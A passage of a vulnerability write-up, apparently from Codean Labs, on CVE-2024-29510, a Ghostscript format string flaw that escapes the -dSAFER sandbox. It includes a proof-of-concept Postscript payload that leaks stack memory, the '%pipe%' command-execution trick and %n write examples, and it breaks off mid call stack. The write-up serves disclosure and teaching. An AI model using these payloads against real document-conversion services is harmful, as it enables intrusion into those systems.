<path d="M21.543 7.104C21.558 7.315 21.558 7.527 21.558 7.74C21.558 14.247 16.604 21.75 7.548 21.75V21.747C4.87223 21.7507 2.25194 20.9842 0 19.539C1.28916 19.6943 2.59629 19.594 3.84665 19.2438C5.09702 18.8936 6.26608 18.3004 7.287 17.498C6.25944 17.4785 5.26365 17.1384 4.43888 16.5252C3.61411 15.912 3.0016 15.0564 2.687 14.078C3.42468 14.2202 4.18515 14.1915 4.91 13.994C3.79573 13.7688 2.79367 13.1651 2.07373 12.2853C1.3538 11.4055 0.96031 10.3038 0.96 9.167V9.105C1.64481 9.48663 2.41138 9.6979 3.195 9.721C2.15247 9.02486 1.41442 7.95759 1.1311 6.73643C0.847781 5.51528 1.04049 4.23206 1.67 3.148C2.90661 4.66915 4.44931 5.91321 6.19795 6.79942C7.94659 7.68563 9.86206 8.19416 11.82 8.292C11.5761 7.23682 11.6865 6.13069 12.1342 5.14454C12.5818 4.15839 13.3418 3.34713 14.2967 2.83612C15.2515 2.32512 16.3481 2.14282 17.4169 2.3174C18.4858 2.49198 19.4674 3.01373 20.21 3.802C21.3132 3.58446 22.3711 3.17997 23.338 2.606C22.9705 3.74647 22.2011 4.71455 21.173 5.33C22.1488 5.21444 23.1017 4.9532 24 4.555C23.3388 5.54378 22.5068 6.40692 21.543 7.104Z"/>
</g>

</svg>
            </a>
            <a href="https://mastodon.social/share?text=CVE-2024-29510+%26%238211%3B+Exploiting+Ghostscript+using+format+strings%20-%20https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F" target="_blank" class="social-share__button">
                <svg width="24" height="24" viewBox="0 0 24 24"  xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M23.2681 5.313C22.9181 2.735 20.6511 0.703 17.9641 0.309C17.5101 0.242 15.7921 0 11.8131 0H11.7831C7.80309 0 6.94809 0.242 6.49509 0.309C3.88209 0.692 1.49609 2.518 0.917094 5.127C0.640094 6.412 0.610094 7.837 0.661094 9.143C0.735094 11.017 0.749094 12.888 0.921094 14.754C1.03909 15.994 1.24609 17.224 1.54109 18.434C2.09109 20.671 4.31809 22.532 6.50109 23.291C8.83709 24.083 11.3501 24.214 13.7571 23.671C14.0221 23.61 14.2841 23.539 14.5431 23.458C15.1281 23.274 15.8131 23.068 16.3171 22.705C16.3239 22.7 16.3294 22.6935 16.3334 22.6861C16.3374 22.6786 16.3397 22.6704 16.3401 22.662V20.853C16.3401 20.8451 16.3383 20.8373 16.3348 20.8302C16.3314 20.8231 16.3263 20.8169 16.3201 20.812C16.3137 20.8069 16.3062 20.8033 16.2983 20.8016C16.2903 20.7999 16.282 20.8 16.2741 20.802C14.7311 21.1671 13.1507 21.35 11.5651 21.347C8.83509 21.347 8.10209 20.063 7.89109 19.529C7.72226 19.0674 7.615 18.5856 7.57209 18.096C7.57168 18.0877 7.57322 18.0794 7.57658 18.0719C7.57995 18.0643 7.58505 18.0576 7.59147 18.0523C7.59789 18.0471 7.60545 18.0434 7.61355 18.0416C7.62165 18.0398 7.63005 18.04 7.63809 18.042C9.15509 18.405 10.7101 18.588 12.2701 18.588C12.6461 18.588 13.0201 18.588 13.3951 18.578C14.9651 18.534 16.6191 18.454 18.1631 18.156C18.2011 18.148 18.2401 18.141 18.2731 18.132C20.7081 17.668 23.0261 16.212 23.2621 12.528C23.2701 12.383 23.2921 11.008 23.2921 10.858C23.2941 10.346 23.4591 7.228 23.2681 5.313ZM19.5201 14.508H16.9591V8.29C16.9591 6.981 16.4091 6.314 15.2891 6.314C14.0591 6.314 13.4431 7.104 13.4431 8.664V12.067H10.8971V8.663C10.8971 7.103 10.2801 6.313 9.04909 6.313C7.93709 6.313 7.38109 6.981 7.37909 8.29V14.508H4.82209V8.102C4.82209 6.792 5.15909 5.752 5.83309 4.982C6.52909 4.212 7.44109 3.818 8.57309 3.818C9.88409 3.818 10.8751 4.318 11.5351 5.316L12.1731 6.376L12.8111 5.316C13.4711 4.317 14.4611 3.818 15.7711 3.818C16.9011 3.818 17.8141 4.213 18.5111 4.982C19.1861 5.752 19.5231 6.792 19.5231 8.102L19.5201 14.508Z"/>
</g>

</svg>
            </a>
        </div>
    </div>
</div>
    </div>
</div>

<div class="content-fields">
    <div class="content-fields__container container container--s">
        
    <h3 class="title heading heading--s">
        TL;DR    </h3>
<div class="text text-block">
    <p>This is a write-up for CVE-2024-29510, a format string vulnerability in Ghostscript ≤ 10.03.0 (but ≥ 9.50). We show how this can be exploited to bypass the <code>-dSAFER</code> sandbox and gain code execution. </p>
<p>This vulnerability has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version.</p>
<p><em>This is part one of a three-part series on Ghostscript vulnerabilities found by Codean Labs.</em></p>
<ul>
<li><em><a href="https://codeanlabs.com/blog/research/cve-2024-29511-abusing-ghostscripts-ocr-device/" target="_blank" rel="noopener">Part two</a> covers CVE-2024-29511, a partial sandbox escape leading to an arbitrary file read/write.</em></li>
<li><em><a href="https://codeanlabs.com/blog/research/ghostscript-wrap-up-overflowing-buffers/" target="_blank">Part three</a> covers CVE-2024-29506, CVE-2024-29507, CVE-2024-29508, and CVE-2024-29509, a set of memory-corruption-related vulnerabilities.</em></li>
</ul>
</div>

    <h2 class="title heading heading--m">
        Introduction    </h2>
<div class="text text-block">
    <p>Ghostscript, first released in 1988 (!), is a Postscript interpreter and a general document conversion toolkit. While originally being a relatively obscure UNIX tool used for talking to printers, it has nowadays found common usage in automated systems where it is used to process user-supplied files.</p>
<p>Specifically, many web applications which handle and convert images or documents will at some point call into Ghostscript. Often indirectly via tools like ImageMagick and LibreOffice. Think of the attachment preview images you see in chat programs and cloud storage applications; in the conversion and rendering logic behind those, there is often an invocation of Ghostscript!</p>
<p>The increase of these automated conversion workflows has pushed Ghostscript developers to implement various sandboxing functionalities and to harden them over time. In recent versions, the <code>-dSAFER</code> sandbox is enabled by default, and blocks or limits all kinds of dangerous operations such as file I/O and command execution which would normally be possible in Postscript.</p>
<p>From a security perspective this is of course very interesting. We have a wide attack surface (user-supplied input files and lots of functionality to explore) and a clear goal (escaping the sandbox, leading to Remote Code Execution (RCE)).</p>
<div class="aside blue">
It is good to remember that Postscript is a well-featured Turing-complete programming language. A bit like TeX, but arguably more general-purpose. Its support for file I/O for example enables one to write document-related conversion and extraction tools in Postscript. From that point-of-view, the ability to execute commands using a pipe (by prefixing a file-open path with <code>|</code> or <code>%pipe%</code>) is just as normal as it is in Perl or Bash.</p>
<p>All of this puts Ghostscript in an odd place where it wants to allow all these legacy use-cases, but it is also commonly being used as a conversion tool on untrusted files, which are often treated more as static graphic descriptions rather than as programs.
</p></div>
</div>

    <h2 class="title heading heading--m">
        Playing in the sandbox    </h2>
<div class="text text-block">
    <p>The <code>-dSAFER</code> sandbox mainly revolves around restricting I/O operations. When enabled, it disallows the <code>%pipe%</code> functionality that would otherwise allow for command execution (e.g., by opening the file <code>%pipe%uname -a</code>), and it restricts file access to a whitelisted set of paths. In a default install, this list includes some Ghostscript-internal paths for things like fonts, and the <code>/tmp/</code> directory (at least on Linux).</p>
<div class="aside green">
<p>Postscript is a stack-based language, which makes it a bit hard to read if you’re not used to it. The code of a Postscript program is in essense a big list of things which are pushed one-by-one on the execution stack. When an operator is encountered, one or more elements of this stack may be consumed, and one or more new ones may be pushed. This is analogous to calculators with reverse-Polish-notation, for example:</p>
<pre><code class="language-postscript">
3 4 add =       % prints "7"
3 4 mul 2 add = % prints "14"
</code></pre>
<p>More complicated logic requires some stack &#8220;juggling&#8221;: operators like <code>pop</code>, <code>dup</code> and <code>exch</code> copy and move things around on the stack.</p>
<p>Postscript has standard types like booleans and numbers, but also strings (<code>(foobar)</code>) (note the parentheses as opposed to quotes), lists (<code>[ 1 2 3 ]</code>), dicts (<code>&lt;&lt; /Key (value) /Foo (bar) /Baz 42 &gt;&gt;</code>) and procedures (<code>{ (Hello world!) = }</code>). Those slash-prefixed dictionary keys are <em>names</em>. They can also be defined on the global scope (that&#8217;s also a dictionary!) using <code>def</code>. You can then dereference them without the slash:</p>
<pre><code class="language-postscript">
/MyVariable (Hello world!) def
MyVariable = % prints "Hello world!"
</code></pre>
<p>Names can also refer to procedures. In this article we&#8217;ll mostly use <code>CamelCase</code> for variables and <code>snake_case</code> for user-defined procedures.</p>
</div>
<p>The fact that <code>/tmp/</code> is fully accessible is quite interesting, as it means that even in a sandboxed environment, a Postscript program can list, read and write anything under <code>/tmp/</code>:</p>
<pre><code class="language-postscript">
% List all files under /tmp/
(/tmp/*) { = } 1024 string filenameforall

% Read and print contents of /tmp/foobar
(/tmp/foobar) (r) file 1024 string readstring pop =

% Write to a (new) file
(/tmp/newfile) (w) file dup (Hello world!) writestring closefile
</code></pre>
<p>In certain integrated usages of Ghostscript this could already be dangerous, as temporary sensitive data or configurations could be stored in <code>/tmp/</code>. Or other people’s uploaded content could be present there.</p>
<p>The ability to read and write files becomes even more interesting from an attacker&#8217;s perspective when combined with the ability to change the output device and its settings. The non-sandboxed <code>setpagedevice</code> operator receives a dictionary with device parameters, including the device name itself. These are equivalent to the fields you&#8217;d often specify on the command-line, including the output filepath. It&#8217;s therefore possible to render a page with an arbitrary device and read back the generated output file, all from within the same execution, independent of the originally set device parameters.</p>
<pre><code class="language-postscript">
% simple_stroke.ps

% Change the current output file and page device (e.g., pdfwrite)
&lt;&lt;
	/OutputFile (/tmp/foobar)
	/OutputDevice /pdfwrite
&gt;&gt; 
setpagedevice

% Some minimal graphical content (a single diagonal stroke)
newpath
100 600 moveto
200 400 lineto
5 setlinewidth
stroke

% Produce a page
showpage

% Read back the contents of the output file
(/tmp/foobar) (r) file 8000 string readstring pop
print
</code></pre>
<p>After showpage is invoked, the device has written out the data corresponding to the content of the page. Hence, we can immediately read this back, in this case printing it to stdout using print:</p>
<pre><code class="language-plaintext">
$ ghostscript -q -dSAFER -dBATCH -dNODISPLAY simple_stroke.ps
%PDF-1.7
%
%%Invocation: ghostscript -q -dSAFER -dBATCH -dNODISPLAY ?
5 0 obj
&lt;&lt;/Length 6 0 R/Filter /FlateDecode&gt;&gt;
stream
x+T03T0A(˥d^ejPeeeh```"r@

e
</code></pre>
<p>The partial binary PDF stream at the end encodes the line we&#8217;ve drawn. If we let the program finish, Ghostscript will close the page device which nicely wraps up the output file <code>/tmp/foobar</code>, in this case a valid PDF with an xref table and everything:</p>
<div class="wp-caption aligncenter"><img decoding="async" src="https://codeanlabs.com/wp-content/uploads/2024/04/screenshot_evince_foobar.png"/><p class="wp-caption-text">The file &#8220;foobar.pdf&#8221; as rendered by a PDF reader.</p></div>
</div>

    <h2 class="title heading heading--m">
        Too universal    </h2>
<div class="text text-block">
    <p>Ghostscript implements dozens of different output devices, as listed in its <code>--help</code> output. A device is just some logic that produces output data. This ranges from <code>x11alpha</code> which shows a window (on Linux) to e.g. <code>jpegcmyk</code> which produces a JPEG file. Similarly, several document types are supported (e.g., XPS, EPS, PDF), but also many variants of printer command languages (e.g., PJL, PCL, epson, deskjet). Devices can be configured and selected (usually with <code>-sDEVICE=</code> on the command-line, but also via <code>setpagedevice</code> from within Postscript as we saw before). Configurable parameters vary by device, but standard ones include the output file, the page format, margins, color profiles, etc.</p>
<div class="aside blue">
Ghostscript is very configurable via the command-line. With the <code>-d</code> and <code>-s</code> prefixes it is possible to set booleans and named fields which are used by the startup logic to configure the device. Some common usecases include:</p>
<pre><code class="language-bash">
# Read a file from stdin, and output it as PNG to stdout
# (e.g., how LibreOffice invokes Ghostscript to render embedded EPS files)
ghostscript -q -dBATCH -dNOPAUSE -sDEVICE=pngalpha -sOutputFile=- -

# Extract pages 3-5 from in.pdf into out.pdf
ghostscript -dNOPAUSE -dQUIET -dBATCH -sOutputFile=out.pdf -dFirstPage=3 -dLastPage=5 -sDEVICE=pdfwrite in.pdf

# Determine the bounding box of an EPS file
ghostscript -q -dBATCH -dNOPAUSE -sDEVICE=bbox -sOutputFile=- img.eps
</code></pre>
</div>
<p>One interesting device is <code>uniprint</code>, the &#8220;universal printer device&#8221;. It is particularly versatile as it can be used to generate command data for different brands and models of printers, just by changing the device&#8217;s configuration parameters. Ghostscript ships with a set of <code>.upp</code> files which are just Ghostscript command-lines (notice <code>-dSAFER</code> and <code>-sDEVICE=uniprint</code> for example) with pre-filled parameters for specific printers, e.g. <code>cdj550.upp</code>:</p>
<pre><code class="language-bash">
-supModel&#61;&#34;HP Deskjet 550c&#44; 300x300DpI&#44; Gamma&#61;2&#34;&#10;-sDEVICE&#61;uniprint&#10;-dNOPAUSE&#10;-P- -dSAFER&#10;-dupColorModel&#61;&#47;DeviceCMYK&#10;-dupRendering&#61;&#47;ErrorDiffusion&#10;-dupOutputFormat&#61;&#47;Pcl&#10;-r300x300&#10;-dupMargins&#61;&#34;&#123; 12&#46;0 36&#46;0 12&#46;0 12&#46;0&#125;&#34;&#10;-dupBlackTransfer&#61;&#34;&#123;&#10;     0&#46;0000 0&#46;0010 0&#46;0042 0&#46;0094 0&#46;0166 0&#46;0260 0&#46;0375 0&#46;0510 &#10;     0&#46;0666 0&#46;0843 0&#46;1041 0&#46;1259 0&#46;1498 0&#46;1758 0&#46;2039 0&#46;2341&#10;     0&#46;2663 0&#46;3007 0&#46;3371 0&#46;3756 0&#46;4162 0&#46;4589 0&#46;5036 0&#46;5505&#10;     0&#46;5994 0&#46;6504 0&#46;7034 0&#46;7586 0&#46;8158 0&#46;8751 0&#46;9365 1&#46;0000&#10;&#125;&#34;&#10;-dupCyanTransfer&#61;&#34;&#123;&#10;     0&#46;0000 0&#46;0010 0&#46;0042 0&#46;0094 0&#46;0166 0&#46;0260 0&#46;0375 0&#46;0510 &#10;     0&#46;0666 0&#46;0843 0&#46;1041 0&#46;1259 0&#46;1498 0&#46;1758 0&#46;2039 0&#46;2341&#10;     0&#46;2663 0&#46;3007 0&#46;3371 0&#46;3756 0&#46;4162 0&#46;4589 0&#46;5036 0&#46;5505&#10;     0&#46;5994 0&#46;6504 0&#46;7034 0&#46;7586 0&#46;8158 0&#46;8751 0&#46;9365 1&#46;0000&#10;&#125;&#34;&#10;-dupMagentaTransfer&#61;&#34;&#123;&#10;     0&#46;0000 0&#46;0010 0&#46;0042 0&#46;0094 0&#46;0166 0&#46;0260 0&#46;0375 0&#46;0510 &#10;     0&#46;0666 0&#46;0843 0&#46;1041 0&#46;1259 0&#46;1498 0&#46;1758 0&#46;2039 0&#46;2341&#10;     0&#46;2663 0&#46;3007 0&#46;3371 0&#46;3756 0&#46;4162 0&#46;4589 0&#46;5036 0&#46;5505&#10;     0&#46;5994 0&#46;6504 0&#46;7034 0&#46;7586 0&#46;8158 0&#46;8751 0&#46;9365 1&#46;0000&#10;&#125;&#34;&#10;-dupYellowTransfer&#61;&#34;&#123;&#10;     0&#46;0000 0&#46;0010 0&#46;0042 0&#46;0094 0&#46;0166 0&#46;0260 0&#46;0375 0&#46;0510 &#10;     0&#46;0666 0&#46;0843 0&#46;1041 0&#46;1259 0&#46;1498 0&#46;1758 0&#46;2039 0&#46;2341&#10;     0&#46;2663 0&#46;3007 0&#46;3371 0&#46;3756 0&#46;4162 0&#46;4589 0&#46;5036 0&#46;5505&#10;     0&#46;5994 0&#46;6504 0&#46;7034 0&#46;7586 0&#46;8158 0&#46;8751 0&#46;9365 1&#46;0000&#10;&#125;&#34;&#10;-dupBeginPageCommand&#61;&#34;&#60;&#10;   1b2a726243&#10;   1b2a7433303052&#10;   1b266c33616f6c45&#10;   1b2a6f31643251&#10;   1b2a703059&#10;   1b2a72732d34753041&#10;   1b2a62326d&#10;&#62;&#34;&#10;-dupAdjustPageWidthCommand&#10;-dupEndPageCommand&#61;&#34;&#40;0M&#92;033&#42;rbC&#92;033E&#92;033&#38;l0H&#41;&#34;&#10;-dupAbortCommand&#61;&#34;&#40;0M&#92;033&#42;rbC&#92;033E&#92;15&#92;12&#92;12&#92;12&#92;12    Printout-Aborted&#92;15&#92;033&#38;l0H&#41;&#34;&#10;-dupYMoveCommand&#61;&#34;&#40;&#37;dy&#92;0&#41;&#34;&#10;-dupWriteComponentCommands&#61;&#34;&#123; &#40;&#37;dv&#92;0&#41; &#40;&#37;dv&#92;0&#41; &#40;&#37;dv&#92;0&#41; &#40;&#37;dw&#92;0&#41; &#125;&#34;
</code></pre>
<p>If you look carefully at the last couple of parameters, you’ll notice that <code>upYMoveCommand</code> and <code>upWriteComponentCommands</code> contain format-string specifiers. Specifically, <code>%d</code> is used to incorporate an integer parameter at a chosen position. Presumably this is needed for versatility across the different printer dialects.</p>
<p>Looking at the codebase confirms that these parameters are indeed used as format strings as-is, but only in case of the <code>\Pcl</code> output format (uniprint supports several types of output formats). In case of <code>upOutputFormat == \Pcl</code>, the function <code>upd_wrtrtl</code> is used for rendering. Inside that function, the contents of <code>upYMoveCommand</code> (copied to <code>upd->strings[S_YMOVE]</code> during device initialization) is used as a format string for the function <code>gs_snprintf</code>, with a calculated “Y position” being passed as a variadic argument:</p>
<pre><code class="language-c">
      &#47;&#42;&#10;       &#42;    Adjust the Printers Y-Position&#10;       &#42;&#47;&#10;      if&#40;upd-&#62;yscan &#33;&#61; upd-&#62;yprinter&#41; &#123; &#47;&#42; Adjust Y-Position &#42;&#47;&#10;         if&#40;1 &#60; upd-&#62;strings&#91;S&#95;YMOVE&#93;&#46;size&#41; &#123;&#10;           gs&#95;snprintf&#40;&#40;char &#42;&#41;upd-&#62;outbuf&#43;ioutbuf&#44; upd-&#62;noutbuf-ioutbuf&#44;&#10;             &#40;const char &#42;&#41; upd-&#62;strings&#91;S&#95;YMOVE&#93;&#46;data&#44;&#10;             upd-&#62;yscan - upd-&#62;yprinter&#41;&#59;&#10;           ioutbuf &#43;&#61; strlen&#40;&#40;char &#42;&#41;upd-&#62;outbuf&#43;ioutbuf&#41;&#59;&#10;         &#125; else &#123;&#10;&#9;&#9;       &#60;snip&#62;&#10;&#9;       &#125;&#10;       &#125;
</code></pre>
<p>&nbsp;<br />
If you’re familiar with format string exploits you’ll now what comes next!</p>
</div>

    <h2 class="title heading heading--m">
        A proof of concept    </h2>
<div class="text text-block">
    <p>As these parameters are just regular device parameters, we can use <code>setpagedevice</code> to change the device to <code>uniprint</code>, just like we did with <code>pdfwrite</code> before. It is then simple to pass arbitrary values for the various <code>upXXXX</code> parameters, just by setting them in the dictionary passed to <code>setpagedevice</code>.</p>
<p>As for the two parameters with format strings, it appears that <code>upYMoveCommand</code> is nicest to play with as it is just a single string which is formatted only once if you render a simple page. It looks like this command is used to tell a printer to move the print head to a specific Y position before printing whatever follows. But for this attack it doesn’t really matter what the intended purpose is.</p>
<p>So, let’s try with a simple proof of concept. We take our previous PDF example where we write to <code>/tmp/foobar</code> and read it back, but replace the <code>setpagedevice</code> invocation with the following:</p>
<pre><code class="language-postscript">
&#37; Change the page device to &#96;uniprint&#96;&#44; setting its output file and other params&#10;&#60;&#60;&#10;&#9;&#47;OutputFile &#40;&#47;tmp&#47;foobar&#41;&#10;&#9;&#47;OutputDevice &#47;uniprint&#10;&#10;&#9;&#37; Required uniprint parameters to reach the &#96;upd&#95;wrtrtl&#40;&#46;&#46;&#46;&#41;&#96; variant&#10;&#9;&#47;upColorModel &#47;DeviceCMYKgenerate&#10;&#9;&#47;upRendering &#47;FSCMYK32&#10;&#9;&#47;upOutputFormat &#47;Pcl&#10;&#9;&#10;&#9;&#37; Set our testing payload&#10;&#9;&#47;upYMoveCommand &#40;1&#58;&#37;x&#92;n2&#58;&#37;x&#92;n3&#58;&#37;x&#92;n4&#58;&#37;x&#92;n5&#58;&#37;x&#92;n6&#58;&#37;x&#92;n7&#58;&#37;x&#92;n8&#58;&#37;x&#92;n&#41;&#10;&#10;&#9;&#37; Set some of the other string parameters&#10;&#9;&#47;upBeginJobCommand &#40;Hello job&#33;&#92;n&#41;&#10;&#9;&#47;upBeginPageCommand &#40;Hello page&#33;&#92;n&#41;&#10;&#10;&#9;&#37; empty strings to reduce spam&#10;&#9;&#47;upWriteComponentCommands &#123;&#40;&#92;0&#41; &#40;&#92;0&#41; &#40;&#92;0&#41; &#40;&#92;0&#41;&#125; &#10;&#62;&#62; &#10;setpagedevice
</code></pre>
<p>This gives us a string like this from the output (which was read back from <code>/tmp/foobar</code>):</p>
<pre><code class="language-plaintext">
Hello job!
Hello page!
1:be
2:be
3:5fd58000
4:5fd580f0
5:5fc36460
6:fffffff0
7:e48f1300
8:60005718
A?????????????????????????
</code></pre>
<p>In between other <code>uniprint</code> output (most of which is actually non-ascii data representing the stroke we drew) we find our formatted string, including the values of the first 8 words on the stack! Basically, the implementation of <code>gs_snprintf</code> blindly reads a “parameter” from the stack for every given format specifier, assuming these were passed as variadic arguments. But because in this case these parameters were not actually supplied (only one integer is given), it reads from locations further down the stack.</p>
<p>Using this technique, we can read the contents of the stack at arbitrary offsets from the current stack pointer, all the way down to the contents of <code>argv</code> and <code>envp</code> (pushed before <code>main</code> is called). This by itself is already useful, as it leaks environment variables and various pointers that could be useful for bypassing ASLR in other exploits. On systems where it is enabled, this also leaks the stack cookie value which can be useful for exploiting stack buffer overflows.</p>
<p>However, we can do more than just print stack values. If we can somehow control a pointer somewhere on the stack, we can use <code>%s</code> to dereference it. While <code>%s</code> stops reading at null-bytes, this is not a problem: if we know we want to read N bytes, we can use <code>%.Ns</code> (e.g., <code>%.8s</code>). If we then get back less than N characters (say M), then we know that a null-byte must have followed and we recurse by reading (N &#8211; M &#8211; 1) bytes from (address + M + 1), until all bytes are read. With N=8, this technique can be used to extract a full pointer stored at a specified address, even if it happens to contain a null-byte.</p>
<p>Similarly — and this is usually the crux of format string attacks — if we can control a value on the stack, we can instead use <code>%n</code> to <em>write</em> to it. This is a relatively obscure and unique specifier which writes the number of characters printed up to that point, to a given pointer argument. A simple example with <code>printf</code>:</p>
<pre><code class="language-c">
int n;
printf("Hello%n world!", &n);
// n == 5;
</code></pre>
<p>&nbsp;</p>
<p>In our scenario there are limitations on the length of the format string, hence we can’t write arbitrarily high values with this (we would need to supply a very long string for high values). We can however use <code>%hn</code> to write an arbitrary 2-byte short to a memory address on the stack, just by putting up to 2^16 bytes of padding data in the format string.</p>
<div class="aside blue">
Fun fact: <code>gs_snprintf</code> invokes <code>apr_vformatter</code>, which is a custom <code>printf</code>-style formatter that ships with Ghostscript. This means that the libc-provided formatter (regular <code>snprintf</code>) is not used in this case, which is beneficial for our attack as that one is often compiled with countermeasures against format string attacks!
</div>
</div>

    <h2 class="title heading heading--m">
        Arbitrary read/write?    </h2>
<div class="text text-block">
    <p>So we can read from and write to pointers that happen to be on the stack, but what about an arbitrary read/write? In textbook format string attacks the format string itself is often located on the stack, providing an easy to control buffer to put an address in:</p>
<pre><code class="language-c">
&#47;&#42; fmt&#46;c &#42;&#47;&#10;&#35;include &#60;stdio&#46;h&#62;&#10;&#35;include &#60;string&#46;h&#62;&#10;&#10;int main&#40;int argc&#44; char &#42;&#42;argv&#41; &#123;&#10;    char fmt&#91;256&#93;&#59;&#10;    strncpy&#40;fmt&#44; argv&#91;1&#93;&#44; sizeof&#40;fmt&#41;&#41;&#59;&#10;    printf&#40;fmt&#41;&#59;&#10;&#125;
</code></pre>
<pre><code class="language-bash">
$ ./fmt 'AAAAAAAA_%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx'
AAAAAAAA_7fff98ccd540,7fff98ccca50,d,0,7c7a77bd2180,7fff98cccbf8,20,4141414141414141,786c252c786c255f
</code></pre>
<p>Notice the literal <code>4141414141414141</code> on the stack, coming from the start of the format string (<code>"AAAAAAAA"</code>). By replacing the corresponding <code>%lx</code> with <code>%n</code> the program will try to write a value to that address:</p>
<pre><code class="language-plaintext">
$ valgrind ./fmt 'AAAAAAAA_%lx,%lx,%lx,%lx,%lx,%lx,%lx,%n,%lx'
...
==671567== Invalid write of size 4
==671567==    at 0x48E2BA1: __printf_buffer (vfprintf-process-arg.c:348)
==671567==    by 0x48E36E0: __vfprintf_internal (vfprintf-internal.c:1523)
==671567==    by 0x48D886E: printf (printf.c:33)
==671567==    by 0x1091EC: main (in fmt)
==671567==  Address 0x4141414141414141 is not stack'd, malloc'd or (recently) free'd
...
</code></pre>
<p>In our case it is sadly not this simple. Our format string is located on the heap, hence we need to find a different value on the stack which we have full control over.</p>
<p>What values does the stack consist of? Well, it always contains the parameters and local variables of each function in the call-stack. Here is the call-stack at the invocation of <code>gs_snprintf</code>:</p>
<pre><code class="language-plaintext">
&#35;0   upd&#95;wrtrtl &#40;upd&#61;0x55555829c610&#44; out&#61;0x55555827fe50&#41; at &#46;&#47;devices&#47;gdevupd&#46;c&#58;6992&#10;&#35;1   upd&#95;print&#95;page &#40;pdev&#61;0x555558550068&#44; out&#61;0x55555827fe50&#41; at &#46;&#47;devices&#47;gdevupd&#46;c&#58;1161&#10;&#35;2   gx&#95;default&#95;print&#95;page&#95;copies &#40;pdev&#61;0x555558550068&#44; prn&#95;stream&#61;0x55555827fe50&#44; num&#95;copies&#61;0x1&#41; at &#46;&#47;base&#47;gdevprn&#46;c&#58;1160&#10;&#35;3   gdev&#95;prn&#95;output&#95;page&#95;aux &#40;pdev&#61;0x555558550068&#44; num&#95;copies&#61;0x1&#44; flush&#61;0x1&#44; seekable&#61;0x0&#44; bg&#95;print&#95;ok&#61;0x0&#41; at &#46;&#47;base&#47;gdevprn&#46;c&#58;1062&#10;&#35;4   gdev&#95;prn&#95;output&#95;page &#40;pdev&#61;0x555558550068&#44; num&#95;copies&#61;0x1&#44; flush&#61;0x1&#41; at &#46;&#47;base&#47;gdevprn&#46;c&#58;1098&#10;&#35;5   default&#95;subclass&#95;output&#95;page &#40;dev&#61;0x5555583c42e8&#44; num&#95;copies&#61;0x1&#44; flush&#61;0x1&#41; at &#46;&#47;base&#47;gdevsclass&#46;c&#58;136&#10;&#35;6   gs&#95;output&#95;page &#40;pgs&#61;0x555558198490&#44; num&#95;copies&#61;0x1&#44; flush&#61;0x1&#41; at &#46;&#47;base&#47;gsdevice&#46;c&#58;207&#10;&#35;7   zoutputpage &#40;i&#95;ctx&#95;p&#61;0x5555581981a8&#41; at &#46;&#47;psi&#47;zdevice&#46;c&#58;502&#10;&#35;8   do&#95;call&#95;operator &#40;op&#95;proc&#61;0x55555646e9e8 &#60;zoutputpage&#62;&#44; i&#95;ctx&#95;p&#61;0x5555581981a8&#41; at &#46;&#47;psi&#47;interp&#46;c&#58;91&#10;&#35;9   interp &#40;pi&#95;ctx&#95;p&#61;0x555558164a50&#44; pref&#61;0x7fffffffd170&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;interp&#46;c&#58;1375&#10;&#35;10  gs&#95;call&#95;interp &#40;pi&#95;ctx&#95;p&#61;0x555558164a50&#44; pref&#61;0x7fffffffd3e0&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;interp&#46;c&#58;531&#10;&#35;11  gs&#95;interpret &#40;pi&#95;ctx&#95;p&#61;0x555558164a50&#44; pref&#61;0x7fffffffd3e0&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;interp&#46;c&#58;488&#10;&#35;12  gs&#95;main&#95;interpret &#40;minst&#61;0x5555581649b0&#44; pref&#61;0x7fffffffd3e0&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;imain&#46;c&#58;257&#10;&#35;13  gs&#95;main&#95;run&#95;string&#95;end &#40;minst&#61;0x5555581649b0&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;imain&#46;c&#58;945&#10;&#35;14  gs&#95;main&#95;run&#95;string&#95;with&#95;length &#40;minst&#61;0x5555581649b0&#44; str&#61;0x555558273390 &#34;&#60;707472732e7073&#62;&#46;runfile&#34;&#44; length&#61;0x18&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;imain&#46;c&#58;889&#10;&#35;15  gs&#95;main&#95;run&#95;string &#40;minst&#61;0x5555581649b0&#44; str&#61;0x555558273390 &#34;&#60;707472732e7073&#62;&#46;runfile&#34;&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;imain&#46;c&#58;870&#10;&#35;16  run&#95;string &#40;minst&#61;0x5555581649b0&#44; str&#61;0x555558273390 &#34;&#60;707472732e7073&#62;&#46;runfile&#34;&#44; options&#61;0x3&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x7fffffffd4d8&#44; perror&#95;object&#61;0x7fffffffd4e0&#41; at &#46;&#47;psi&#47;imainarg&#46;c&#58;1169&#10;&#35;17  runarg &#40;minst&#61;0x5555581649b0&#44; pre&#61;0x555557000263 &#34;&#34;&#44; arg&#61;0x7fffffffd658 &#34;ptrs&#46;ps&#34;&#44; post&#61;0x555557000914 &#34;&#46;runfile&#34;&#44; options&#61;0x3&#44; user&#95;errors&#61;0x1&#44; pexit&#95;code&#61;0x0&#44; perror&#95;object&#61;0x0&#41; at &#46;&#47;psi&#47;imainarg&#46;c&#58;1128&#10;&#35;18  argproc &#40;minst&#61;0x5555581649b0&#44; arg&#61;0x7fffffffd658 